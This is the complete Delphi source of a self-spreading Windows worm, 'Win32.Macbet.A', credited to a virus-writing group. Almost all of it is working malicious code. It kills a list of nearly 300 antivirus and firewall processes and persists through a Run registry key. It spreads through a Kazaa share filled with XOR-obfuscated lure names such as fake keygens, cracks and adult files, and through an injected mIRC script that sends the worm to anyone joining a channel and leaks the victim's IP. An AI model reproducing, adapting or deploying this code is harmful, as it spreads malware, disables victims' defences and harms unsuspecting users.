   {
    Win32.Macbet.A by Hutley / GeDzAc
    e-mail: hutleyvx@gmail.com

    Win32.Macbet.A:
    + Infect and Auto distribute by mIRC, and KaZaa
    + Kill AVs and Firewalls
    + Infect Any Windows folders
    + No Payload

    Greetz:
           GeDzAc: Thanks a lot brothers!
           aXLiTo: Your codes Help Me.
           Del_Armg0: Great Tutorial of IRC Worms
           Disidents: Great e-zines
   }

   program Macbet;

   // {$APPTYPE CONSOLE}

   uses
     Windows, SysUtils, Registry, TLHelp32, IniFiles, Classes;

   const
     about: string = 'Win32.Macbet.A by Hutley/GEDZAC';
     FwAv: array[0..296] of string = (
       'avp32.exe', 'avpmon.exe', 'zonealarm.exe', 'vshwin32.exe', 'vet95.exe',
       'tbscan.exe', 'serv95.exe', 'Nspclean.exe', 'clrav.com', 'scan32.exe',
       'rav7.exe', 'navw.exe', 'outpost.exe', 'nmain.exe', 'navnt.exe',
       'mpftray.exe', 'lockdown2000.exe', 'icssuppnt.exe', 'icload95.exe', 'iamapp.exe',
       'findviru.exe', 'f - agnt95.exe', 'dv95.exe', 'dv95_o.exe', 'claw95ct.exe',
       'cfiaudit.exe', 'avwupd32.exe', 'avptc32.exe', '_avp32.exe', 'avgctrl.exe',
       'apvxdwin.exe', '_avpcc.exe', 'avpcc.exe', 'wfindv32.exe', 'vsecomr.exe',
       'tds2 - nt.exe', 'sweep95.exe', 'EFINET32.EXE', 'scrscan.exe', 'safeweb.exe',
       'persfw.exe', 'navsched.exe', 'nvc95.exe', 'nisum.exe', 'navlu32.exe',
       'ALOGSERV', 'AMON9X', 'AVGSERV9', 'AVGW', 'avkpop',
       'avkservice', 'AvkServ', 'avkwctl9', 'AVXMONITOR9X', 'AVXMONITORNT',
       'AVXQUAR', 'moolive.exe', 'jed.exe', 'icsupp95.exe', 'ibmavsp.exe',
       'frw.exe', 'f - stopw.exe', 'espwatch.exe', 'procexp', 'filemon.exe',
       'regmon.exe', 'dvp95.exe', 'cfiadmin.exe', 'avwin95.exe', 'avpm.exe',
       'avp.exe', 'ave32.exe', 'anti - trojan.exe', 'webscan.exe', 'webscanx.exe',
       'vsscan40.exe', 'tds2 - 98. exe', 'SymProxySvc', 'SYMTRAY', 'TAUMON',
       'TCM', 'TDS - 3 ', 'TFAK', 'vbcmserv', 'VbCons',
       'VIR - HELP', 'VPC32', 'VPTRAY', 'VSMAIN', 'vsmon',
       'WIMMUN32', 'WGFE95', 'WEBTRAP', 'WATCHDOG', 'WrAdmin',
       'sphinx.exe', 'scanpm.exe', 'rescue.exe', 'pcfwallicon.exe', 'pavcl.exe',
       'nupgrade.exe', 'navwnt.exe', 'navapw32.exe', 'luall.exe', 'iomon98.exe',
       'icmoon.exe', 'fprot.exe', 'f - prot95.exe', 'esafe.exe', 'cleaner3.exe',
       'IBMASN.EXE', 'AVXW', 'cfgWiz', 'CMGRDIAN', 'CONNECTIONMONITOR',
       'CPDClnt', 'DEFWATCH', 'CTRL', 'defalert', 'defscangui',
       'DOORS', 'EFPEADM', 'ETRUSTCIPE', 'EVPN', 'EXPERT',
       'fameh32', 'fch32', 'fih32', 'blackice.exe', 'avsched32.exe',
       'avpdos32.exe', 'avpnt.exe', 'avconsol.exe', 'ackwin32.exe', 'NWTOOL16',
       'pccwin97', 'PROGRAMAUDITOR', 'POP3TRAP', 'PROCESSMONITOR', 'PORTMONITOR',
       'POPROXY', 'pcscan', 'pcntmon', 'pavproxy', 'PADMIN',
       'pview95', 'rapapp.exe', 'REALMON', 'RTVSCN95', 'vsstat.exe',
       'vettray.exe', 'tca.exe', 'smc.exe', 'scan95.exe', 'rav7win.exe',
       'pccwin98.exe', 'KPFW32.EXE', 'ADVXDWIN', 'padmin.exe', 'normist.exe',
       'navw32.exe', 'n32scan.exe', 'lookout.exe', 'iface.exe', 'icloadnt.exe',
       'SPYXX', 'SS3EDIT', 'SweepNet', 'iamserv.exe', 'fp - win.exe',
       'f - prot.exe', 'ecengine.exe', 'cleaner.exe', 'cfind.exe', 'blackd.exe',
       'RULAUNCH', 'sbserv', 'SWNETSUP', 'WrCtrl', 'avpupd.exe',
       'avkserv.exe', 'autodown.exe', '_avpm.exe', 'AvpM.exe', 'regedit.exe',
       'msconfig.exe', 'FPROT95.EXE', 'IBMASN.EXE', 'sfc.exe', 'regedt32.exe',
       'offguard.exe', 'pav.exe', 'pavmail.exe', 'per.exe', 'perd.exe',
       'pertsk.exe', 'perupd.exe', 'pervac.exe', 'pervacd.exe', 'th.exe',
       'th32.exe', 'th32upd.exe', 'thav.exe', 'thd.exe', 'thd32.exe',
       'thmail.exe', 'alertsvc.exe', 'amon.exe', 'kpf.exe', 'antivir',
       'avsynmgr.exe', 'cfinet.exe', 'cfinet32.exe', 'icmon.exe', 'lockdownadvanced.exe',
       'lucomserver.exe', 'mcafee', 'navapsvc.exe', 'navrunr.exe', 'nisserv.exe',
       'nsched32.exe', 'pcciomon.exe', 'pccmain.exe', 'pview95.exe', 'Avnt.exe',
       'Claw95cf.exe', 'Dvp95_0.exe', 'Vscan40.exe', 'Icsuppnt.exe', 'Jedi.exe',
       'N32scanw.exe', 'Pavsched.exe', 'Pavw.exe', 'Avrep32.exe', 'Monitor.exe',
       'fsgk32', 'fsm32', 'fsma32', 'fsmb32', 'gbmenu',
       'GBPOLL', 'GENERICS', 'GUARD', 'IAMSTATS', 'ISRV95',
       'LDPROMENU', 'LDSCAN', 'LUSPT', 'MCMNHDLR', 'MCTOOL',
       'MCUPDATE', 'MCVSRTE', 'MGHTML', 'MINILOG', 'MCVSSHLD',
       'MCAGENT', 'MPFSERVICE', 'MWATCH', 'NeoWatchLog', 'NVSVC32',
       'NWService', 'NTXconfig', 'NTVDM', 'ntrtscan', 'npssvc',
       'npscheck', 'netutils', 'ndd32', 'NAVENGNAVEX15', 'notstart.exe',
       'zapro.exe', 'pqremove.com', 'BullGuard', 'CCAPP.EXE', 'vet98.exe',
       'VET32.EXE', 'VCONTROL.EXE', 'claw95.exe', 'ANTS', 'ATCON',
       'ATUPDATER', 'ATWATCH', 'AutoTrace', 'AVGCC32', 'AvgServ',
       'AVWINNT', 'fnrb32', 'fsaa', 'fsav32', 'ZAP.EXE',
       'ZAPD.EXE', 'ZAPPRG.EXE', 'ZAPS.EXE', 'ZCAP.EXE', 'pfwagent.exe',
       'pfwcon.exe', 'zlclient.exe');

   function code(text: string; chave: integer): string;
   var lp1, p: integer;
     fuck: string;
   begin
     lp1 := strlen(pchar(text));
     for p := 1 to lp1 do begin
       fuck := fuck + chr(ord(text[p]) xor chave)
     end;
     code := fuck
   end;

   function KillaTarefas(ExeFileName: string): integer;
   const
     PROCESS_TERMINATE = $0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     result := 0;
     FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
     while integer(ContinueLoop) <> 0 do begin
       if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) = UpperCase(ExeFileName)) or
         (UpperCase(FProcessEntry32.szExeFile) = UpperCase(ExeFileName))) then
         Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),
           FProcessEntry32.th32ProcessID), 0));
       ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
     end;
     CloseHandle(FSnapshotHandle);
   end;

   function WinDir: string;
   begin
     SetLength(Result, MAX_PATH);
     Windows.GetWindowsDirectory(PChar(Result), MAX_PATH);
     Result := string(PChar(Result)) + '\';
   end;

   function SysDir: string;
   begin
     SetLength(Result, MAX_PATH);
     if GetSystemDirectory(PChar(Result), MAX_PATH) > 0 then
       Result := string(PChar(Result)) + '\'
     else
       Result := '';
   end;

   function RetornaTexto(Texto: string; Caracter: Char): string;
   var
     I, Posicao1, Posicao2: Integer;
     TextoInvertido: string;
   begin
     Result := '';
     for I := Length(Texto) downto 1 do
     begin
       TextoInvertido := TextoInvertido + Texto[I]
     end;
     Posicao1 := Pos(Caracter, Texto) + 1;
     Posicao2 := Pos(Caracter, TextoInvertido) - 1;
     Result := Copy(Texto, Posicao1, Length(Texto) - (Posicao1 + Posicao2));
   end;

   function mIRCDir: string;
   var regMirc: TRegistry;
   begin
     regMirc := TRegistry.Create;
     regMirc.RootKey := HKEY_LOCAL_MACHINE;
     if regMirc.KeyExists('SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC') then
     begin
       regMirc.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC', True);
       Result := ExtractFilePath(RetornaTexto(regMirc.ReadString('UninstallString'), '"'));
     end else Result := '';
     regMirc.CloseKey;
   end;

   procedure InfectaMirc;
   var infm: array[0..260] of Char;
     MircIni: TIniFile;
     StrMirc: TStrings;
     ScptMAcbet: TextFile;
   begin
     if mIRCDir <> '' then
     begin
       GetModuleFileNameA(0, infm, SizeOf(infm));
       // in mIRC's path it creates the "porn_in_msn.txt.pif"
       CopyFile(infm, PChar(mIRCDir + code('ujwkZlkZhvk+q}q+ulc', 05)), True);
       // in path Downloads of mIRC it creates the "fotos.jpg.pif"
       CopyFile(infm, PChar(mIRCDir + 'download\' + code('gnunr/kqf/qhg', 1)), True);
     end;
     // it records in mirc.ini
     MircIni := TIniFile.Create(mIRCDir + 'mirc.ini');
     StrMirc := TStringList.Create;
     MircIni.ReadSection('rfiles', StrMirc);
     MircIni.WriteString('rfiles', 'n' + IntToStr(StrMirc.Count), 'macbet.mrc');
     MircIni.Free;
     // write inside Macbet.MRC
     AssignFile(ScptMacbet, mIRCDir + 'macbet.mrc');
     Rewrite(ScptMacbet);
     Writeln(ScptMacbet, '; mIRC.Macbet by Hutley/GeDzAc');
     Writeln(ScptMacbet, '; Don´t modify this file.');
     Writeln(ScptMacbet, '');
     Writeln(ScptMacbet, 'on 1:JOIN:#:{');
     Writeln(ScptMacbet, ' if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ $decode(cG9ybl9pbl9tc24udHh0LnBpZg==,m)');
     Writeln(ScptMacbet, '}');
     Writeln(ScptMacbet, '');
     Writeln(ScptMacbet, 'on 1:SENDFAIL:*:{ halt }');
     Writeln(ScptMacbet, '');
     Writeln(ScptMacbet, 'on 1:FileSent:*:{ if ($filename == $decode(cG9ybl9pbl9tc24udHh0LnBpZg==,m)) { halt } ');
     Writeln(ScptMacbet, '');
     Writeln(ScptMacbet, 'alias unload { .echo -a $decode(KiBVbmxvYWRlZCBzY3JpcHQgJw==,m) $+ $2 $+ } ');
     Writeln(ScptMacbet, 'alias remove { .echo -a $decode(KiBSZW1vdmVkIGZpbGU=,m) $+ $2 $+ }');
     Writeln(ScptMacbet, '');
     Writeln(ScptMacbet, 'ctcp *:ctcp:$2- | halt');
     Writeln(ScptMacbet, '');
     Writeln(ScptMacbet, 'on *:TEXT:!macbet:#:{ .notice $decode(SHV0bGV5IGknbSBoZXJlIQ==, m) $ip }');
     CloseFile(ScptMacbet);
   end;

   procedure ExecutaViaRegistro(nome, path: string);
   var evrg: TRegistry;
   begin
     evrg := TRegistry.Create;
     evrg.RootKey := HKEY_LOCAL_MACHINE;
     evrg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', FALSE);
     evrg.WriteString(nome, path);
     evrg.Destroy;
   end;

   procedure EspalhaPeloWindows;
   var epw: array[0..260] of Char;
   begin
     GetModuleFileNameA(0, epw, SizeOf(epw));
     if not (FileExists(Windir + code('b}o}} kvk', 14))) then
     begin
       CopyFile(epw, PChar(Windir + code('b}o}} kvk', 14)), True); // copy to windows path!
       ExecutaViaRegistro('WinExec', Windir + code('b}o}} kvk', 14));
     end else
       ExecutaViaRegistro('WinExec', Windir + code('b}o}} kvk', 14));
   end;

   procedure EspalhaPeloKazaa(Pasta: string);
   var epk: array[0..260] of Char;
     adk: array[0..19] of string;
     i: integer;
   begin
     GetModuleFileNameA(0, epk, SizeOf(epk));
     //key 20 - pair files | 30 - odd files
     adk[0] := 'vxun}x}uzKs}fxg:gwf'; // blazilian_girls.scr
     adk[1] := 'sgAmwmj{lAxk}uwpy0nwx'; // my_sister_fucking.pif
     adk[2] := 's}fxgK{fsm:d}r'; // girls_orgy.pif
     adk[3] := 'm{fAwpAjv{A}wjg0m}l'; // sex_in_the_city.scr
     adk[4] := ' qmsqzKc}zld:qlq'; // keygen_winxp.exe
     adk[5] := '}l }uA zq|{A }lq| jA)0{f{'; // crack_adobe_acrobat_7.exe
     adk[6] := ' qmsqzKC}zB}g`u:qlq'; // keygen_WinVista.exe
     adk[7] := '}l }uA }jwh jwqpAiwpfn0{f{'; // crack_activation_winxp.exe
     adk[8] := ' qmsqzKn{zquxufy:qlq'; // keygen_zonealarm.exe
     adk[9] := 'zhz}qngA}l }u0{f{'; // dvdcopy_crack.exe
     adk[10] := 'ccc|uw Kdu`w|:qlq'; // wwwhack_patch.exe
     adk[11] := 'iwps{A}v py{m0nwx'; // winme_changes.pif
     adk[12] := 'c}zK-lKw{yyuzpg:d}r'; // win_9x_commands.pif
     adk[13] := ' zq|{Ayqrwh{Au{gy{p0nwx'; // adobe_golive_keygen.pif
     adk[14] := 'pqxd|}&$$!Kwfuw :d}r'; // delphi2005_crack.pif
     adk[15] := 'z{rnvw&Ajqll{pj0nwx'; // delphi8_torrent.pif
     adk[16] := 'b}gauxvug}wKwfuw :d}r'; // visualbasic_crack.pif
     adk[17] := 'iwpl lAn j}v0nwx'; // winrar_patch.pif
     adk[18] := 'cccr}xqg|ufq:gwf'; // wwwfileshare.scr
     adk[19] := 'p{j|kmA}l }u0m}l'; // netbus_crack.scr

     for i := 0 to 19 do
     begin
       case i of
         0, 2, 4, 6, 8, 10, 12, 14, 16, 18: CopyFile(epk, PChar(Pasta + code(adk[i], 20)), True);
         1, 3, 5, 7, 9, 11, 13, 15, 17, 19: CopyFile(epk, PChar(Pasta + code(adk[i], 30)), True);
       end;
     end;
   end;

   procedure RegistroDoKazaa(pasta: string);
   var regK: TRegistry;
   begin
     regK := TRegistry.Create;
     regK.RootKey := HKEY_CURRENT_USER;
     if regK.KeyExists('Software\Kazaa\LocalContent') then
     begin
       regK.OpenKey('Software\Kazaa\LocalContent', True);
       regK.WriteBool('DisableSharing', False);
       regK.WriteString('dir0', '012345:' + WinDir + Pasta);
       regK.WriteString('dir1', '012345:C:\');
       regK.WriteString('dir2', '012345:' + WinDir + Pasta);
       regK.WriteString('dir3', '012345:C:\');
       regK.CloseKey;
     end;
     if regK.KeyExists('Software\Kazaa\ResultsFilter') then
     begin
       regK.OpenKey('Software\Kazaa\ResultsFilter', true);
       regK.WriteBool('virus_filter', False);
       regK.WriteBool('firewall_filter', False);
       regK.CloseKey;
     end;
   end;


   procedure PastaWindows;
   var pw: array[0..260] of Char;
     apw: array[0..9] of string;
     i: integer;
   begin
     GetModuleFileNameA(0, pw, SizeOf(pw));
     apw[0] := 'æøÿ¿ôéô'; // Win.exe - key 145 for numbers of array pair
     apw[1] := 'xfafaf!|l}'; // Winini.scr - key 15 for numbers of array odd
     apw[2] := 'üâ÷òú¿ôéô'; // msfck.exe - Chave 145
     apw[3] := 'b|xfa<=!jwj'; // mswin32.exe - Chave 15
     apw[4] := 'æøÿýþö¿áø÷'; // winlog.pif - Chave 145
     apw[5] := '|v|}j|j{!|l}'; // sysreset.scr - Chave 15
     apw[6] := 'âèâþ÷÷¿áø÷'; // sysoff.pif - Chave 145
     apw[7] := '{n|dmn}!jwj'; // taskbar.exe - Chave 15
     apw[8] := 'åðâúôã¿áø÷'; // tasker.pif - Chave 145
     apw[9] := '{gjizld!|l}'; // thefuck.scr - Chave 15

     for i := 0 to 9 do
     begin
       case i of
         0, 2, 4, 6, 8: CopyFile(pw, PChar(Windir + code(apw[i], 145)), True);
         1, 3, 5, 7, 9: CopyFile(pw, PChar(Windir + code(apw[i], 15)), True);
       end;
     end;
   end;

   var
     i: integer;

   begin
     PastaWindows;
     EspalhaPeloWindows;
     for i := 0 to 295 do KillaTarefas(FwAv[i]);

     if DirectoryExists(WinDir + code('D_VERk', 55)) then EspalhaPeloKazaa(WinDir + code('D_VERk', 55)) else
     if ForceDirectories(WinDir + code('D_VERk', 55)) then EspalhaPeloKazaa(WinDir + code('D_VERk', 55));

     RegistroDoKazaa(WinDir + code('D_VERk', 55));

     InfectaMirc;
   end.
